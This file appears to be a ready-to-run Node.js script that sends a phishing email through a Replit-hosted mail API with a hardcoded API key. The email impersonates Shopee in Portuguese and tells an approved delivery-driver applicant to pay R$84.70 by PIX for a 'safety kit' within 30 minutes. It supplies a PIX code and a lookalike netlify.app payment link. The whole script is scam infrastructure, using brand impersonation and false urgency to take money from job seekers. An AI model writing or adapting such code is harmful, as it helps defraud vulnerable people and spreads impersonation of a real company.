import axios from 'axios';

const url = 'https://api-entregador.replit.app/api/send';
const headers = {
  'Content-Type': 'application/json',
  'X-API-Key': '8c6638b0-7a89-4c3f-bd2c-2afd6d1e4123'
};
const payload = {
  recipient: 'teste@exemplo.com',
  subject: 'Confirmação: Seu cadastro de entregador foi aprovado',
  body: `<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cadastro de Entregador Aprovado - Shopee</title>
    <style>
        body { 
            font-family: 'Roboto', 'Helvetica', 'Arial', sans-serif; 
            background-color: #f4f4f4; 
            margin: 0; 
            padding: 0; 
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .header {
            background-color: #F64535;
            padding: 20px;
            text-align: center;
        }
        .content {
            padding: 30px;
        }
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 20px;
        }
        p {
            color: #555;
            margin-bottom: 15px;
            line-height: 1.5;
        }
        .payment-info {
            background-color: #fff8f0;
            border: 1px solid #ffdfc2;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
        }
        .payment-info h2 {
            color: #F64535;
            font-size: 18px;
            margin-top: 0;
        }
        .qrcode {
            text-align: center;
            margin: 20px 0;
        }
        .pix-code {
            background-color: #f5f5f5;
            padding: 15px;
            border-radius: 5px;
            font-family: monospace;
            word-break: break-all;
            margin: 15px 0;
        }
        .button {
            display: inline-block;
            background-color: #F64535;
            color: white;
            text-decoration: none;
            padding: 12px 25px;
            border-radius: 50px;
            font-weight: bold;
            text-align: center;
            margin: 20px 0;
        }
        .button:hover {
            background-color: #D63A2B;
        }
        .cta {
            text-align: center;
            margin: 25px 0;
        }
        .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #eee;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <img src="https://i.imgur.com/zTrIKuu.png" alt="Logo da Shopee" width="150">
        </div>
        
        <!-- Content -->
        <div class="content">
            <h1>Cadastro Aprovado - Realize o Pagamento</h1>
            
            <p>Olá, <strong>Teste Automatizado</strong>!</p>
            
            <p>Parabéns! Seu cadastro para se tornar um Entregador Parceiro Shopee foi <strong>aprovado com sucesso</strong>.</p>
            
            <p>Para completar o processo e garantir sua segurança, precisamos que você efetue o pagamento do <strong>Kit de Segurança Shopee</strong>, um requisito essencial para todos os nossos entregadores parceiros.</p>
            
            <div class="payment-info">
                <h2>Informações do Pagamento</h2>
                <p><strong>Valor:</strong> $84,70</p>
                <p><strong>Método:</strong> PIX</p>
                <p><strong>Prazo:</strong> O pagamento expira em 30 minutos</p>
                
                <div class="qrcode">
                    <img src="https://i.imgur.com/zTrIKuu.png" alt="QR Code do PIX" width="200">
                    <p>Escaneie o QR Code acima com o app do seu banco</p>
                </div>
                
                <p><strong>Ou copie o código PIX abaixo:</strong></p>
                <div class="pix-code">
                    00020126580014BR.GOV.BCB.PIX0136a37c47d6-86fb-4a33-8773-ebf21511efe15204000053039865802BR5925ASAAS PAGAMENTOS S.A.6014RIO DE JANEIRO62070503***6304E2CA
                </div>
            </div>
            
            <div class="cta">
                <a href="https://shopee-entregador.netlify.app/payment" class="button">Acessar página de pagamento</a>
            </div>
            
            <p>Após o pagamento, o prazo de entrega do seu Kit de Segurança é de aproximadamente <strong>5 dias úteis</strong>.</p>
            
            <p>O kit contém:</p>
            <ul>
                <li>2 Coletes de identificação oficial Shopee</li>
                <li>1 Par de Luvas de proteção</li>
                <li>1 Par de Botinas de segurança</li>
            </ul>
            
            <p>Ao receber o kit, você estará pronto para iniciar suas atividades como Entregador Parceiro Shopee.</p>
            
            <div class="footer">
                <p>Para dúvidas ou suporte, entre em contato: <strong>suporte.entregador@shopee.com.br</strong></p>
                <p>Este é um e-mail automático. Por favor, não responda diretamente a esta mensagem.</p>
                <p>© 2023 Shopee. Todos os direitos reservados.</p>
            </div>
        </div>
    </div>
</body>
</html>`,
  html: true
};

console.log('Enviando email de teste...');

axios.post(url, payload, { headers })
  .then(response => {
    console.log('Resposta do servidor de email:');
    console.log(response.data);
  })
  .catch(error => {
    console.error('Erro ao enviar email:');
    if (error.response) {
      console.error(error.response.data);
    } else {
      console.error(error.message);
    }
  });